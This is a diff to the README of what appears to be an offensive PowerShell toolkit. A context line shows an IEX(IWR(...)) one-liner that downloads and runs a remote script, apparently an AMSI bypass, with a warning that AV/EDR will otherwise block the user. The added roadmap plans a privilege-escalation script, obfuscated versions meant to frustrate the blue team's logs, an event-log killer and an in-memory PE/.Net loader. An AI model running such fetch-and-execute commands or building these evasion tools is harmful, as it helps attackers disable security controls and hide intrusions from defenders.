@@ -15,6 +15,21 @@ IEX(IWR('https://raw.githubusercontent.com/RaouzRouik/smallposh/main/amsibp-dec-
 or else AV/EDR will surely block you right away!
 
 
+# roadmap
+
+Add extra doc on usage
+
+Add a privesc script that will go wmic qfe
+
+Add obfuscated version of each script so the blue team have less fun with their logs
+
+Add an eventlogkiller (maybe)
+
+Add a small PE/.Net injector/in-memory loader
+
+
+
+
 # credits
 
 All credits go to their respective owners:
